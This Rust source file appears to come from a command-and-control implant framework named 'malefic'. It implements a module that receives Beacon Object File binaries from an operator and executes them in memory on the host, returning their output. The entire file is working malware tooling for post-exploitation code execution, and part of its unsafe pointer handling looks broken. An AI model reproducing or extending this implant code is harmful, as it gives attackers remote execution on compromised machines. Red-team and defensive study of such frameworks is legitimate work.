use std::ffi::CString;
use std::ptr::null;
use prost::Message;
use crate::{Module, TaskResult, check_request, to_error, Result};
use malefic_helper::protobuf::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_trait::module_impl;
use malefic_helper::protobuf::implantpb::AssemblyResponse;

pub struct ExecuteBof {}

#[async_trait]
#[module_impl("bof")]
impl Module for ExecuteBof {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::ExecuteBinary)?;
        let bin = &request.bin;
        let args = request.params;
        let mut result: Vec<u8> = Vec::new();
        #[cfg(feature = "community")]
        {
            use crate::MaleficBofLoader;
            let ep: *const u8;
            if request.entry_point.is_empty() {
                ep = null();
            } else {
                ep = request.entry_point.as_ptr() // ep = Some(request.entry_point);
            }
            let str_slices: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
            let str_args: *const *const u8 = str_slices.as_ptr() as *const *const u8;
            let ret = unsafe {MaleficBofLoader(bin.as_ptr(), bin.len(), str_args, ep)};
            if ret.is_null() {
                to_error!(Err("Bof Loader failed!".to_string()))?
            }
            let ret_s = unsafe {CString::from_raw(ret as _).to_string_lossy().to_string()};
            result = ret_s.into_bytes();
        }
        #[cfg(feature = "professional")]
        {
            use malefic_win_kit::bof::loader::bof_loader;
            let ep: Option<String>;
            if request.entry_point.is_empty() {
                ep = None
            } else {
                ep = Some(request.entry_point);
            }

            result = unsafe {
                to_error!(bof_loader(bin, args, ep))?.encode_to_vec()
            };

        }

        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
            status: 0,
            data: result,
            err: "".to_string(),
        })))
    }
}

